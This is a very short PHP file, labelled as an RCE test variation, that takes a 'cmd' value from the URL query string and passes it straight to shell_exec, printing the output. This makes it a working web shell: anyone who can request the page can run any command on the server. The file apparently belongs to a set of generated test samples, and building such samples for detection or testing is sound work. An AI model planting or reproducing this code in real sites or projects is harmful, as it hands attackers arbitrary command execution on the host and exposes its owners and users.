<?php
// RCE test variation #1204
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>